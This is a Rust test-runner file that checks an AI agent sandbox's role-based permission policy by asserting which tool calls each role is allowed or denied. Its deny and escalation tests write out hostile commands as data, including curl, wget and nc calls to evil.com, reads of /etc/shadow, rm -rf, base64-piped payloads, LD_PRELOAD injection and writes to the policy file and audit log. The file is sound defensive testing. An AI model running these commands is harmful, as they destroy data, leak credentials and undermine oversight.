//! Test runner framework — runs positive and negative tests against containers

use crate::policy::{Decision, Policy, Role};
use anyhow::Result;
use reqwest::Client;
use serde_json::{json, Value};
use std::time::Duration;
use tracing::{error, info};

pub struct TestRunner {
    client: Client,
    base_url: String,
    role: Role,
    policy: Policy,
}

#[derive(Debug)]
pub struct TestResult {
    pub name: String,
    pub passed: bool,
    pub expected: String,
    pub actual: String,
}

impl std::fmt::Display for TestResult {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        let icon = if self.passed { "PASS" } else { "FAIL" };
        write!(f, "[{}] {} (expected={}, actual={})", icon, self.name, self.expected, self.actual)
    }
}

impl TestRunner {
    pub fn new(base_url: &str, role: Role, policy: Policy) -> Self {
        let client = Client::builder()
            .timeout(Duration::from_secs(30))
            .build()
            .unwrap();

        Self {
            client,
            base_url: base_url.to_string(),
            role,
            policy,
        }
    }

    /// Run all tests for this role. Returns (passed, failed) counts.
    pub async fn run_all(&self) -> Result<(usize, usize)> {
        let mut results = Vec::new();

        // Health check first
        results.push(self.test_health().await);

        // Positive tests: things this role CAN do
        results.extend(self.positive_tests().await);

        // Negative tests: things this role CANNOT do
        results.extend(self.negative_tests().await);

        // Escalation tests: bypass attempts
        results.extend(self.escalation_tests().await);

        let passed = results.iter().filter(|r| r.passed).count();
        let failed = results.iter().filter(|r| !r.passed).count();

        for r in &results {
            if r.passed {
                info!("  {}", r);
            } else {
                error!("  {}", r);
            }
        }

        info!("{}: {}/{} passed", self.role, passed, passed + failed);
        Ok((passed, failed))
    }

    async fn test_health(&self) -> TestResult {
        // Skip health check in policy-only mode (no real container)
        if self.base_url.contains("localhost:0") || self.base_url.contains(":0/") || self.base_url.ends_with(":0") {
            return TestResult {
                name: "health_check".to_string(),
                passed: true,
                expected: "200".to_string(),
                actual: "skipped (no container)".to_string(),
            };
        }
        let url = format!("{}/health", self.base_url);
        match self.client.get(&url).send().await {
            Ok(resp) if resp.status().is_success() => TestResult {
                name: "health_check".to_string(),
                passed: true,
                expected: "200".to_string(),
                actual: "200".to_string(),
            },
            Ok(resp) => TestResult {
                name: "health_check".to_string(),
                passed: false,
                expected: "200".to_string(),
                actual: resp.status().to_string(),
            },
            Err(e) => TestResult {
                name: "health_check".to_string(),
                passed: false,
                expected: "200".to_string(),
                actual: e.to_string(),
            },
        }
    }

    async fn positive_tests(&self) -> Vec<TestResult> {
        let mut results = Vec::new();

        // All roles can read
        results.push(self.test_tool_call(
            "read_workspace_file",
            "read",
            json!({"file_path": "/workspace/README.md"}),
            Decision::Allow,
        ).await);

        // All roles can glob
        results.push(self.test_tool_call(
            "glob_workspace",
            "glob",
            json!({"pattern": "*.rs", "path": "/workspace"}),
            Decision::Allow,
        ).await);

        // All roles can grep
        results.push(self.test_tool_call(
            "grep_workspace",
            "grep",
            json!({"pattern": "fn main", "path": "/workspace"}),
            Decision::Allow,
        ).await);

        // WRITE+ can write
        if matches!(self.role, Role::Write | Role::Local | Role::Poke | Role::Probe | Role::Agent | Role::Operator) {
            results.push(self.test_tool_call(
                "write_workspace_file",
                "write",
                json!({"file_path": "/workspace/test-output.txt", "content": "test"}),
                Decision::Allow,
            ).await);
        }

        // LOCAL+ can bash (basic)
        if matches!(self.role, Role::Local | Role::Poke | Role::Probe | Role::Agent | Role::Operator) {
            results.push(self.test_tool_call(
                "bash_ls",
                "bash",
                json!({"command": "ls /workspace"}),
                Decision::Allow,
            ).await);
        }

        // POKE+ can curl GET
        if matches!(self.role, Role::Poke | Role::Probe | Role::Agent | Role::Operator) {
            results.push(self.test_tool_call(
                "bash_curl_get",
                "bash",
                json!({"command": "curl -s http://example.com"}),
                Decision::Allow,
            ).await);
        }

        // PROBE+ can curl POST
        if matches!(self.role, Role::Probe | Role::Agent | Role::Operator) {
            results.push(self.test_tool_call(
                "bash_curl_post",
                "bash",
                json!({"command": "curl -X POST http://example.com"}),
                Decision::Allow,
            ).await);
        }

        results
    }

    async fn negative_tests(&self) -> Vec<TestResult> {
        let mut results = Vec::new();

        // Universal denials — apply to ALL roles

        // No role can read /etc/shadow
        results.push(self.test_tool_call(
            "deny_read_etc_shadow",
            "read",
            json!({"file_path": "/etc/shadow"}),
            Decision::Deny,
        ).await);

        // No role can read policy file
        results.push(self.test_tool_call(
            "deny_read_policy",
            "read",
            json!({"file_path": "/etc/agenticlaw/policy.json"}),
            Decision::Deny,
        ).await);

        // Role-specific denials
        match self.role {
            Role::Read => {
                results.push(self.test_tool_call(
                    "deny_write_tool", "write",
                    json!({"file_path": "/workspace/x.txt", "content": "x"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_edit_tool", "edit",
                    json!({"file_path": "/workspace/x.txt", "old_string": "a", "new_string": "b"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_bash_tool", "bash",
                    json!({"command": "ls"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_bash_rm", "bash",
                    json!({"command": "rm -rf /workspace"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_bash_curl", "bash",
                    json!({"command": "curl http://evil.com"}),
                    Decision::Deny,
                ).await);
            }
            Role::Write => {
                results.push(self.test_tool_call(
                    "deny_bash_tool", "bash",
                    json!({"command": "ls"}),
                    Decision::Deny,
                ).await);
                // CRITICAL #3: bash tool is denied entirely for WRITE,
                // so even sh invocations via bash must be denied
                results.push(self.test_tool_call(
                    "deny_bash_sh_script", "bash",
                    json!({"command": "sh /workspace/x.sh"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_bash_python", "bash",
                    json!({"command": "python3 -c 'import os; os.system(\"rm -rf /\")'"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_bash_bin_sh", "bash",
                    json!({"command": "/bin/sh -c 'cat /etc/shadow'"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_write_etc", "write",
                    json!({"file_path": "/etc/crontab", "content": "evil"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_write_outside_workspace", "write",
                    json!({"file_path": "/tmp/escape.txt", "content": "evil"}),
                    Decision::Deny,
                ).await);
            }
            Role::Local => {
                results.push(self.test_tool_call(
                    "deny_bash_curl", "bash",
                    json!({"command": "curl http://evil.com"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_bash_wget", "bash",
                    json!({"command": "wget http://evil.com"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_bash_nc", "bash",
                    json!({"command": "nc evil.com 4444"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_bash_ssh", "bash",
                    json!({"command": "ssh root@evil.com"}),
                    Decision::Deny,
                ).await);
            }
            Role::Poke => {
                results.push(self.test_tool_call(
                    "deny_curl_post", "bash",
                    json!({"command": "curl -X POST http://evil.com -d 'data'"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_curl_delete", "bash",
                    json!({"command": "curl -X DELETE http://evil.com/resource"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_wget_post", "bash",
                    json!({"command": "wget --post-data='x' http://evil.com"}),
                    Decision::Deny,
                ).await);
            }
            Role::Probe => {
                results.push(self.test_tool_call(
                    "deny_sudo", "bash",
                    json!({"command": "sudo cat /etc/shadow"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_mount", "bash",
                    json!({"command": "mount /dev/sda1 /mnt"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_chroot", "bash",
                    json!({"command": "chroot /tmp/evil"}),
                    Decision::Deny,
                ).await);
            }
            Role::Agent => {
                results.push(self.test_tool_call(
                    "deny_fdisk", "bash",
                    json!({"command": "fdisk /dev/sda"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_mkfs", "bash",
                    json!({"command": "mkfs.ext4 /dev/sda1"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_systemctl", "bash",
                    json!({"command": "systemctl stop docker"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_reboot", "bash",
                    json!({"command": "reboot"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_insmod", "bash",
                    json!({"command": "insmod evil.ko"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_write_proc_sys", "write",
                    json!({"file_path": "/proc/sys/kernel/hostname", "content": "evil"}),
                    Decision::Deny,
                ).await);
            }
            Role::Operator => {
                // Operator: sub-policy restrictions
                results.push(self.test_tool_call(
                    "deny_write_policy_file", "write",
                    json!({"file_path": "/etc/agenticlaw/policy.json", "content": "{}"}),
                    Decision::Deny,
                ).await);
                results.push(self.test_tool_call(
                    "deny_write_audit_log", "write",
                    json!({"file_path": "/var/log/agenticlaw/audit.jsonl", "content": "tamper"}),
                    Decision::Deny,
                ).await);
            }
        }

        results
    }

    async fn escalation_tests(&self) -> Vec<TestResult> {
        let mut results = Vec::new();

        // Path traversal
        results.push(self.test_tool_call(
            "escalation_path_traversal",
            "read",
            json!({"file_path": "/workspace/../etc/shadow"}),
            Decision::Deny,
        ).await);

        // Base64 obfuscation
        if matches!(self.role, Role::Local | Role::Poke | Role::Probe | Role::Agent | Role::Operator) {
            results.push(self.test_tool_call(
                "escalation_base64_pipe",
                "bash",
                json!({"command": "echo cm0gLXJmIC8= | base64 -d | bash"}),
                Decision::Deny,
            ).await);

            results.push(self.test_tool_call(
                "escalation_ld_preload",
                "bash",
                json!({"command": "LD_PRELOAD=/tmp/evil.so ls"}),
                Decision::Deny,
            ).await);

            results.push(self.test_tool_call(
                "escalation_proc_self",
                "bash",
                json!({"command": "/proc/self/exe --malicious"}),
                Decision::Deny,
            ).await);

            results.push(self.test_tool_call(
                "escalation_command_substitution",
                "bash",
                json!({"command": "echo $(rm -rf /workspace)"}),
                Decision::Deny,
            ).await);
        }

        results
    }

    /// Test a single tool call against the policy engine.
    /// This tests the policy decision locally (not via HTTP to the container).
    async fn test_tool_call(
        &self,
        name: &str,
        tool: &str,
        args: Value,
        expected: Decision,
    ) -> TestResult {
        let actual = self.policy.check_tool_call(tool, &args);
        let passed = match expected {
            Decision::Deny => actual == Decision::Deny,
            Decision::Allow => actual == Decision::Allow || actual == Decision::Ask,
            Decision::Ask => actual == Decision::Ask,
        };

        TestResult {
            name: name.to_string(),
            passed,
            expected: expected.to_string(),
            actual: actual.to_string(),
        }
    }
}

/// Run tests for a single role using policy-only checks (no container needed).
pub async fn test_role_policy(role: Role) -> Result<(usize, usize)> {
    let policy_path = format!("policies/{}.json", role.name());
    let policy = Policy::load(&policy_path)?;
    let runner = TestRunner::new("http://localhost:0", role, policy);
    runner.run_all().await
}

/// Run policy tests for all roles.
pub async fn test_all_policies() -> Result<(usize, usize)> {
    let mut total_passed = 0;
    let mut total_failed = 0;

    for role in Role::all() {
        info!("=== Testing {} ===", role);
        let (p, f) = test_role_policy(*role).await?;
        total_passed += p;
        total_failed += f;
    }

    info!("=== TOTAL: {}/{} passed ===", total_passed, total_passed + total_failed);
    Ok((total_passed, total_failed))
}
